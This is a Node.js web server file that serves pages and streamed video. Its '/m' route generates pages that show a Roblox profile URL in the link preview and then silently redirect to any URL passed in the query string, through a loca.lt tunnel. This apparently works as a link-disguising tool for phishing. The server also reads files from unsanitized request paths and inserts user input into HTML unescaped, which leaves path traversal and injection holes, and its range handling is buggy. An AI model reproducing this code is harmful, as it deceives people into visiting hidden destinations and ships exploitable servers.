const Pages = "./Page"

const http = require("http");
const fs = require("fs");

const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

function generateString(length) {
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }

    return result;
}

const HTTPserver = http.createServer((req, res) => {


    console.log(req.url);
    var use = ""
    if (req.url.endsWith("js")) {
        res.writeHead(200, { "Content-Type": "text/javascript" });
        use = ".js"
    } else if (req.url.endsWith("css")) {
        res.writeHead(200, { "Content-Type": "text/css" });
        use = ".css"
    } else if (req.url.endsWith("zip")) {
        res.writeHead(200, { "Content-Type": "application/zip" });
        use = ".zip"
    } else if (req.url.endsWith("mp4")) {
        async function scan() {
            const range = await req.headers.range;
            if (!range) {
                res.writeHead(400);
                res.write('Missing range header');
            }
            console.log(range);

            const videoPath = "./../../ServerBuild/ServerStorage/Web/Pages" + req.url;
            console.log(videoPath);
            const videoSize = fs.statSync(Pages + req.url).size;

            const CHUNK_SIZE = 10 ** 6;
            const start = Number(range.replace(/\D/g, ""));
            const end = Math.min(start + CHUNK_SIZE, videoSize - 1);

            const contentLength = end - start + 1;
            const headers = {
                "Content-Range": `bytes ${start}-${end}/${videoSize}`,
                "Accept-Ranges": "bytes",
                "Content-Length": contentLength,
                "Content-Type": "video/mp4",
            };

            res.writeHead(206, headers);

            const videoStream = fs.createReadStream(videoPath, { start, end });

            videoStream.pipe(res);
        }
        scan();
    } else if (req.url.endsWith("mp3")) {
        res.writeHead(200, { "Content-Type": "audio/mp3" });
        use = ".mp3"
    } else if (req.url.endsWith("jpeg")) {
        res.writeHead(200, { "Content-type": "image/jpeg" });
        use = ".jpeg"
    } else if (req.url.endsWith("png")) {
        res.writeHead(200, { "Content-type": "image/png" });
        use = ".png"
    } else {
        res.writeHead(200, { "Content-Type": "text/html" });
        use = ".html"
    }
    if (req.url == "/") {
        fs.readFile(Pages + "/Home.html", null, (err, data) => {
            if (err) {
                res.write(`<!DOCTYPE html>

                <html>
                    <head>
                        <title>Error 404</title>
                        <meta http-equiv="refresh" content="0; url='/Error404.html'" />
                    </head>
                
                    <body>
                    </body>
                </html>`)
            } else {
                res.write(data);
            }
            res.end();
        });
    } else if (req.url.startsWith("/m")) {
        var ID = generateString(Math.floor(Math.random() * 11));
        var l = req.url.split("?")[1];
        fs.writeFile(Pages + "/" + ID, `<!DOCTYPE html>

        <html>
            <head>
                <title>Document</title>
                <meta content="https://web.roblox.com/users/26511210/profile" property="og:title" />
                <meta content="https://qwer.loca.lt/` + l + `" property="og:url" />
                <meta content="#36393f" data-react-helmet="true" name="theme-color" />
                <meta http-equiv="refresh" content="0; url='` + l + `" />
            </head>
        
            <body>
            </body>
        </html>`, (err) => {

        });
        res.write(`<!DOCTYPE html>

                <html>
                    <head>
                        <title>Generating...</title>
                    </head>
                
                    <body>
                    <script>
                        setTimeout(() => {
                            window.location.replace("https://qwer.loca.lt/Home.html?` + ID + `");
                        }, 3000)
                    </script>
                    </body>
                </html>`)
    } else if (req.url == "/StreamService/VideoPlayer.html") {
        fs.readFile(Pages + "/StreamService/VideoPlayer.html", null, (err, data) => {
            if (err) {
                res.write(`<!DOCTYPE html>

                <html>
                    <head>
                        <title>Error 404</title>
                        <meta http-equiv="refresh" content="0; url='/Error404.html'" />
                    </head>
                
                    <body>
                    </body>
                </html>`)

            } else {
                res.write(data);
            }
        });
    } else {
        fs.readFile(Pages + req.url.split("?")[0], null, (err, data) => {
            if (err) {
                res.write(`<!DOCTYPE html>

                <html>
                    <head>
                        <title>Error 404</title>
                        <meta http-equiv="refresh" content="0; url='/Error404.html'" />
                    </head>
                
                    <body>
                    </body>
                </html>`)
            } else {
                res.write(data);
            }
            res.end();
        });
    }
});

HTTPserver.listen(5050, () => console.log("You Server is up. on http://localhost:5050"));